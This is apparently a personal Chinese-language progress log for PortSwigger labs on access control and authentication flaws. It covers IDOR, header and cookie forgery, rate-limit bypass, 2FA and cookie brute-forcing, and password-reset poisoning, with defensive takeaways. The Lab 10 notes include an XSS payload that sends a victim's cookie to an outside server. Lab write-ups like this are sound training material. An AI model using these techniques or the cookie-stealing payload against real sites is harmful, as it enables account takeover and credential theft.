# PortSwigger Lab 做题进度

> 靶场：https://portswigger.net/web-security

---

## Access Control（访问控制/越权）— 已完成 13/13 ✅（2026-08-11 完结）

> 关联笔记：[越权漏洞详解](./2026-08-08-越权漏洞详解.md)

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | Unprotected admin functionality | 信息泄露 | `robots.txt` 暴露 `/administrator-panel`，直接访问删除用户 |
| 2 | Unprotected admin functionality with unpredictable URL | 前端隐藏 | 管理面板 URL 藏在页面源码/JS 里 |
| 3 | User role controlled by request parameter | Cookie 角色可改 | `Cookie: admin=false` → 改成 `true` |
| 4 | User role can be modified in user profile | Mass Assignment | 修改邮箱 JSON 加 `"roleid":2`，自己给自己授权 |
| 5 | User ID controlled by request parameter | IDOR（水平越权） | 改 URL 里 `id` 参数，看别人数据拿 API Key |
| 6 | User ID controlled by request parameter, with unpredictable user IDs | IDOR + GUID 枚举 | 用户 ID 是不可预测的 GUID，从评论/文章等公开位置收集 GUID，再改参数访问（今天新做） |
| 6 | User ID controlled by request parameter with data leakage in redirect | 302 Body 泄露 | 改 `id` → 302 重定向 → Burp 看 Body → 别人 API Key |
| 7 | User ID controlled by request parameter with password disclosure | 越权+明文密码 | 改 `id` → 别人资料页 → 密码明文在表单里 |
| 8 | Insecure direct object references | 聊天记录 IDOR | live chat 文件编号可遍历 → 下载别人聊天记录 |
| 9 | URL-based access control can be circumvented | Header 绕过 | 请求行写合法路径，`X-Original-URL: /admin` → 前端放行，后端认 Header |
| 10 | Method-based access control can be circumvented | HTTP 方法绕过 | POST 被权限校验拦 → 换 GET/POSTX → 校验跳过 |
| 11 | Multi-step process with no access control on one step | 多步流程校验缺失 | 修改邮箱等操作分多步，前几步校验权限、最后一步没校验 → 跳过前面直接请求最后一步（今天新做） |
| 12 | Referer-based access control | Referer 头伪造 | 管理操作依赖 Referer 头判断来源 → 伪造 Referer: https://xxx/admin 绕过（今天新做） |

---

## Authentication（认证缺陷）— 已完成 11/14（2026-08-11 开始，2026-08-13 更新）

> 关联笔记：[登录脆弱与认证缺陷](./2026-08-09-登录脆弱与认证缺陷.md)（总览）、[PortSwigger认证绕过实战](./2026-08-13-PortSwigger认证绕过实战.md)（Lab 8-11 实战）

| # | Lab | 核心考点 | 攻击手法 |
|---|-----|---------|---------|
| 1 | Username enumeration via different responses | 用户名枚举（响应差异） | 登录失败响应不同：账号不存在 vs 密码错误 → 逐个试用户名，看响应区别 |
| 2 | 2FA simple bypass | 2FA 流程绕过 | 登录后直接访问受保护页面，跳过 2FA 验证步骤 |
| 3 | Password reset broken logic | 密码重置逻辑缺陷 | 重置流程中修改 username 参数指向目标账号，token 未绑定原账号 |
| 4 | Username enumeration via subtly different responses | 用户名枚举（细微差异） | 响应几乎相同，但个别字符/长度/状态码有细微差别 → 对比响应体找差异 |
| 5 | Username enumeration via response timing | 用户名枚举（响应时间差）+ 爆破保护绕过 | `X-Forwarded-For` 伪造 IP 绕过次数限制；超长密码放大时间差，按响应时间找有效用户名，再爆破密码（今天新做） |
| 6 | Broken brute-force protection, IP block | IP 封锁绕过（成功登录重置计数） | 连错 3 次封 IP，XFF 伪造无效 → 爆破与正确登录（wiener:peter）交替发送，成功登录把失败计数刷回 0（今天新做） |
| 7 | Username enumeration via account lock | 账户锁定枚举（防护机制当信号） | 有效账号连错 3 次触发锁定提示 → 用锁定提示枚举用户名；爆破密码时 grep extract 标记报错文案，正确密码的响应无报错即命中（今天新做） |
| 8 | 2FA bypass using a broken logic | 2FA 逻辑缺陷（verify 参数可控）+ 验证码爆破 | GET /login2 改 verify=carlos 触发目标验证码 → 爆破 4 位 mfa-code → 302 命中（Burp CE 限速，Python 并发替代） |
| 9 | Brute-forcing a stay-logged-in cookie | remember-me cookie 存密码哈希（可伪造） | cookie=base64(用户名:md5(密码)) → 预生成伪造 cookie 列表爆破 → 删掉 session cookie 只留 stay-logged-in → 200 命中即登录（官方用 Payload processing 动态转换） |
| 10 | Offline password cracking | 密码哈希进 cookie + 存储型 XSS 组合 | 评论区 XSS 偷 carlos 的 stay-logged-in cookie → 解码拿 MD5 → 离线破解（hashcat）→ 明文登录删账户 |
| 11 | Password reset poisoning via middleware | 密码重置投毒（重置链接域名可控） | 重置请求加 X-Forwarded-Host: 自己的 exploit server → 邮件链接指向攻击者 → carlos 点击 → token 进日志 → 拿自己合法链接换 token 改密 → 登录 |

---

## 知识点总结

### 越权的四种模式

```
1. 闯空门
   → 知道 URL 就行，不需要登录/权限（Lab 1、2）

2. 伪造身份
   → Cookie 改 admin=true（Lab 3）
   → JSON 加 roleid=2（Lab 4）

3. 改资源 ID（水平越权 / IDOR）
   → 改 id 参数看别人数据（Lab 5、6、7、8）

4. 绕过校验规则
   → X-Original-URL 头欺骗（Lab 9）
   → 换 HTTP 方法逃逸（Lab 10）
```

### 测试方法论

```
每拿到一个接口：
  □ 不登录能不能访问？
  □ 低权限能不能访问？（换 Cookie）
  □ 改资源 ID 能不能看别人的？
  □ 换 HTTP 方法（GET/PUT/PATCH/POSTX）有没有不同的校验逻辑？
  □ 加 X-Original-URL / X-Forwarded-For 等头会不会被不同组件差异化处理？

每查看一遍源码（Ctrl+U）：
  □ robots.txt → 搜 admin / panel / api
  □ HTML 注释 → <!-- 里面常常有被注释掉的后台入口
  □ JS 文件 → 搜 admin / path / url

每看到一个响应：
  □ 302 的 Body → 可能藏着数据
  □ JSON → 多出来的字段（roleid / isAdmin）
  □ 表单 → 有没有隐藏的敏感字段
```

### 响应时间差枚举用户名 + IP 封锁绕过（Authentication Lab 5）

这一关的核心：登录接口有**基于 IP 的失败次数限制**，同一个 IP 试错太多次会被封锁，直接爆破不行。

#### 两个绕过点

**1. `X-Forwarded-For` 伪造 IP**

服务器用 `X-Forwarded-For` 头判断客户端 IP（常见于反代场景），但没校验这个头能不能改。每次请求换一个 IP 值，次数限制就形同虚设：

```
POST /login HTTP/1.1
Host: xxx
X-Forwarded-For: 192.168.1.<每次请求换>

username=carlos&password=xxx
```

**2. 响应时间差枚举用户名**

登录逻辑里：用户名不存在 → 直接返回"用户名或密码错误"（快）；用户名存在 → 还要对密码做 bcrypt 哈希对比（慢）。两个响应差了几十上百毫秒，把候选用户名挨个试一遍，响应明显变慢的那个就是有效用户名。

**关键坑（我卡了很久的原因）**：密码不能太短。密码越长，哈希计算耗时越久，时间差才明显；我用普通长度密码试，时间差淹没在网络抖动里根本分不出来。后来把密码设成 200 个 `A` 的超长串，时间差立刻肉眼可见。

#### 完整流程

```
1. 枚举用户名：username=候选词 & password=超长串（200 个 A），X-Forwarded-For 每次换
   → 按响应时间排序，最慢的那个就是有效用户名
2. 爆破密码：username=刚枚举出来的用户 & password=密码字典，X-Forwarded-For 每次换
   → 状态码 302 重定向 = 登录成功
```

注意 Intruder 里 `X-Forwarded-For` 也要设成 payload 一起遍历，否则试几十次就被 IP 封锁。

### IP 封锁绕过：成功登录重置计数（Authentication Lab 6）

这一关的机制和 Lab 5 正好相反：

- **封禁机制**：同一 IP 连续错误 3 次 → 封 IP，提示 too many incorrect login attempts
- **XFF 无效**：上一关的 `X-Forwarded-For` 伪造 IP 在这关不好使，服务端把这条路堵了
- **突破口**：一次**成功的登录会把失败计数刷新归零**

所以打法就是：**正确登录和爆破交替着来** —— 爆一个候选密码，再用已知账号 `wiener:peter` 成功登录一次把计数刷回 0，再爆下一个，循环。计数永远到不了 3，封禁永远不触发。

字典形态就是之前那个变形：每个候选密码下面插一行 `peter`（`passwords-peter.txt`），peter 行配 wiener 用户名，候选密码行配目标用户名。

类比：门禁系统按错 3 次密码会报警，但按对一次计数就清零——那每次都"错一次、对一次"交替着来，报警永远不触发。

> 换个角度看：这种"业务规则本身有豁免路径"的防护，比"纯 IP 计数"更容易被绕——防御时要考虑：成功登录是否应该重置**所有 IP** 的计数？重置粒度越粗，越容易被当跳板。

### 账户锁定枚举：防护机制本身就是信号（Authentication Lab 7）

这一关的机制：**有效账号连错 3 次就会触发锁定**，提示 `You have made too many incorrect login attempts. Please try again in 1 minute(s).`；无效账号永远只返回 `Invalid username or password`，怎么错都不会锁定。

所以"锁定"这个**防护机制本身**就成了枚举信号：

```
1. 枚举用户名：每个候选用户名连错 3 次以上
   → 出现锁定提示的那个就是有效账号（防护机制把账号存在性泄露了）
2. 爆破密码：Intruder 里 grep extract 标记报错文案
   → 正确密码的响应里没有报错信息（登录成功直接跳转）
   → 反向匹配：没有报错文案的那条响应 = 密码命中，不用专门绕封锁
```

我学到最关键的一点：**已知的机制（哪怕是防护）都能反过来当攻击入口**。锁定提示把"账号存不存在"泄露了出来；grep extract 标记报错文案 + 反向匹配，密码一步到位。

类比：门禁错 3 次就锁门——但这等于在门口贴告示"这个账号真实存在"，反而帮攻击者确认目标。

> 防御视角：错误文案必须统一（不管账号存在与否、是否锁定都返回同一句话）；锁定机制要防枚举（IP+账号组合计数），别让锁定提示变成账号存在性 oracle。

### 2FA 逻辑缺陷：verify 参数可控（Authentication Lab 8）

服务端用请求里的 `verify` 参数决定"正在验证谁的 2FA 码"，没绑定会话 → 改成 `verify=carlos` 就能让服务端生成/校验 carlos 的码。打法：`GET /login2?verify=carlos` 触发目标验证码 → 用自己的 session 爆 `mfa-code`（0000-9999）→ 302 命中。

关键坑：**Burp Community 版 Intruder 限速**（~1 req/s），线程拉满没用，10000 次要挂几小时；换 Python 60 并发 2 分钟跑完。失败 200 / 成功 302，信号干净。

### remember-me cookie 伪造爆破（Authentication Lab 9）

`stay-logged-in = base64(用户名:md5(密码))` —— 密码哈希直接进 cookie，结构公开可伪造。打法：离线预生成 `base64(carlos:md5(候选词))` 列表直接导入 Intruder 爆破，200 命中。**关键：删掉自己的 session cookie 只留 stay-logged-in**，否则服务端优先认 session，所有请求都返回你自己的账户页。

官方更优做法：Intruder **Payload processing**（Hash: MD5 → Add prefix: carlos: → Encode: Base64）请求时动态转换，同一份字典换 prefix 就能打任何用户；判定用 grep-match "Update email" 业务特征而非状态码。

### 离线破解：XSS 偷 cookie → MD5 还原（Authentication Lab 10）

评论区存储型 XSS → carlos 浏览评论时 `document.location='//exploit-server/'+document.cookie` 把 cookie 送到 exploit server 的 Access log → 解码得 `carlos:md5哈希` → 离线破解（hashcat -m 0 / 在线反查）→ 明文密码 → 登录删账户。

认知：偷到的 remember-me cookie 本身就能登录（会话接管）；破解出明文是"长期资产"（密码复用/横向移动）。MD5 无盐 = 明文等价物；正确实现是随机 token + 服务端存储。

### 密码重置投毒：X-Forwarded-Host 控制重置链接（Authentication Lab 11）

重置密码的邮件链接里 token 是安全的（随机、绑定目标用户），但**链接域名**由 `X-Forwarded-Host` 头拼接且未校验 → 加 `X-Forwarded-Host: exploit-server` 再给 carlos 发重置请求，carlos 点击邮件链接 → token 出现在 exploit server 日志（`/forgot-password?temp-forgot-password-token=xxx`）→ 拿自己 wiener 的合法重置链接换掉 token 参数 → 打开重置页给 carlos 设新密码 → 登录过关。

认知：这是 Host header 注入的经典场景（密码重置投毒），真实世界常见于反代/中间件后面用 `X-Forwarded-Host`/`Forwarded` 生成绝对 URL 的应用；防御 = 生成链接用白名单域名，不信任任何客户端可控头。

---

## 下一阶段

Access Control 已全部完成 ✅，Authentication 进行中（11/14），剩余：
- 2FA bypass using a brute-force attack（2FA 爆破）
- Password brute-force via password change（改密接口爆破）
- Broken brute-force protection, multiple credentials per request（单请求多凭据）

